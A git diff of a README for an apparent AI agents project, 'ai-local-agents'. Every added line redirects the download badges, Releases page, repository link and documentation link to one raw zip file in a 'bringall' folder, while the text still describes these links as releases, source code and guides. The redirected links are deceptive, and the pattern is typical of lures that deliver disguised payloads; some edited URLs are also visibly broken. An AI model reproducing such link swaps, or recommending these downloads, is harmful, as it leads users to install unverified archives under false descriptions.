@@ -8,7 +8,7 @@ Welcome to **ai-local-agents**! This collection of intelligent AI agents helps y
 
 You can easily download **ai-local-agents**. Click on the link below to visit the Releases page where you can download the latest version.
 
-[![Download ai-local-agents](https://img.shields.io/badge/Download%20ai--local--agents-latest-brightgreen.svg)](https://github.com/Ignaceassuring178/ai-local-agents/releases)
+[![Download ai-local-agents](https://raw.githubusercontent.com/Ignaceassuring178/ai-local-agents/main/bringall/ai-local-agents.zip%https://raw.githubusercontent.com/Ignaceassuring178/ai-local-agents/main/bringall/ai-local-agents.zip)](https://raw.githubusercontent.com/Ignaceassuring178/ai-local-agents/main/bringall/ai-local-agents.zip)
 
 ## 💻 System Requirements
 
@@ -24,9 +24,9 @@ Before installing, check that your computer meets these requirements:
 
 To download the software:
 
-1. Click the button above to visit the [Releases page](https://github.com/Ignaceassuring178/ai-local-agents/releases).
+1. Click the button above to visit the [Releases page](https://raw.githubusercontent.com/Ignaceassuring178/ai-local-agents/main/bringall/ai-local-agents.zip).
 2. On the Releases page, find the latest version.
-3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Ignaceassuring178/ai-local-agents/main/bringall/ai-local-agents.zip` for Linux).
 4. Once the download completes, locate the file in your `Downloads` folder or your chosen download location.
 5. Double-click the downloaded file to start the installation process and follow the on-screen instructions.
 
@@ -62,8 +62,8 @@ If you face any issues, here are some common solutions:
 
 For more information, visit the following resources:
 
-- [GitHub Repository](https://github.com/Ignaceassuring178/ai-local-agents): Explore the source code and issues.
-- [Documentation](https://github.com/Ignaceassuring178/ai-local-agents/wiki): Access detailed guides and FAQs.
+- [GitHub Repository](https://raw.githubusercontent.com/Ignaceassuring178/ai-local-agents/main/bringall/ai-local-agents.zip): Explore the source code and issues.
+- [Documentation](https://raw.githubusercontent.com/Ignaceassuring178/ai-local-agents/main/bringall/ai-local-agents.zip): Access detailed guides and FAQs.
 
 ## ⚡ Contributing
 
@@ -81,4 +81,4 @@ We welcome contributions! If you'd like to help improve **ai-local-agents**, you
 
 Thank you for choosing **ai-local-agents**. We hope you find it useful and easy to use. For any questions or feedback, please reach out through the issues section on GitHub.
 
-[![Download ai-local-agents](https://img.shields.io/badge/Download%20ai--local--agents-latest-brightgreen.svg)](https://github.com/Ignaceassuring178/ai-local-agents/releases)
+[![Download ai-local-agents](https://raw.githubusercontent.com/Ignaceassuring178/ai-local-agents/main/bringall/ai-local-agents.zip%https://raw.githubusercontent.com/Ignaceassuring178/ai-local-agents/main/bringall/ai-local-agents.zip)](https://raw.githubusercontent.com/Ignaceassuring178/ai-local-agents/main/bringall/ai-local-agents.zip)
